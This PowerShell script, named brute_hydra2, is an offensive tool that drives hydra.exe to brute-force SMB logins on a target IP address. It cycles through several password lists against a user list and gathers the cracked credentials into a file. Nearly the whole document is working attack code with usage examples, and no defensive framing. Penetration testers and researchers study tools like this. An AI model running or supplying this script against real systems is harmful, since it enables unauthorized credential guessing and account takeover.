$name="brute_hydra2"
$version="1.0"

$ProgressPreference = 'SilentlyContinue'	
$ErrorActionPreference = 'SilentlyContinue'

$global:target=$args[0]
$global:domain=$args[1]
$global:userlist=$args[2]
$global:custompass=$args[3]


if (!$domain) { 
# if no domain is given then set it to a '.' 
$global:domain="."
}

if (!$userlist) { 
$global:userlist="users.txt"
}

function debug {
echo "----------------------------"
echo "target:		$target"
echo "userlist:	$userlist"
echo "domain:		$domain"
echo "custompass:	$custompass"
echo "----------------------------"
}  



function hydra-check-cracked {
Get-Content .\hydra_brute.txt | findstr "\[smb\]" | sort-object| Get-Unique > hydra_brute_cracked.txt	
}

function hydra-password {
Write-Output ""
Write-Output "[+] password"
Write-Output ""

# password
.\hydra.exe -L .\users.txt -P .\pass_password.txt -o hydra.txt $target smb
hydra-check-cracked
}
function hydra-pass5 {
Write-Output ""
Write-Output "[+] pass5.txt"
Write-Output ""
# pass5.txt
.\hydra.exe -L .\users.txt -P .\pass5.txt -e snr -o hydra.txt $target smb
Write-Output ""
hydra-check-cracked
}
function hydra-pass10 {
Write-Output ""
Write-Output "[+] pass10.txt"
Write-Output ""
# pass5.txt
.\hydra.exe -L .\users.txt -P .\pass10.txt -o hydra.txt $target smb
Write-Output ""
hydra-check-cracked
}
function hydra-pass100 {
Write-Output ""
Write-Output "[+] pass100.txt"
Write-Output ""
# pass5.txt
.\hydra.exe -L .\users.txt -P .\pass100.txt -o hydra.txt $target smb
Write-Output ""
hydra-check-cracked
}
function hydra-custompass {
Write-Output ""
Write-Output "[+] $custompass"
Write-Output ""
.\hydra.exe -L .\users.txt -P $custompass  -o hydra.txt $target smb
Write-Output ""
hydra-check-cracked
}


function run-hydra {
echo "" > .\hydra_brute.log 
hydra-password
hydra-pass5
hydra-pass10
hydra-pass100
#
#if (!$custompass) { 
#hydra-custompass
#}

Get-Content .\hydra_brute_cracked.txt


}


if ($target) { 
echo "" > .\hydra_brute.log
debug
run-hydra | Tee hydra_brute.txt
} else {
Write-Host "$name $version" 
Write-Host "============================" 
Write-Host "USEAGE: " 
Write-Host "	./$name.ps1 [IP ADDRESS]"
Write-Host "	./$name.ps1 [IP ADDRESS] [DOMAIN] [USER LIST] [PASS LIST]" 
Write-Host ""
Write-Host "EXAMPLES"
Write-Host "	./$name.ps1 192.168.80.50"
Write-Host "	./$name.ps1 192.168.80.50 INECURE.local" 
Write-Host "	./$name.ps1 172.16.0.10 secure users.txt pass3k.txt" 
Write-Host "" 
Write-Host "POSITIONS"
Write-Host "	1	IP ADDRESS - required! wont run without this" 
Write-Host "	2	DOMAIN - optional - will default to '.'" 
Write-Host "	3	USER LIST - optional - will default to .\users.txt" 
Write-Host "	4	PASS LIST - optional - can give it your own password list to run at the end" 
Write-Host "" 
Write-Host "" 
}



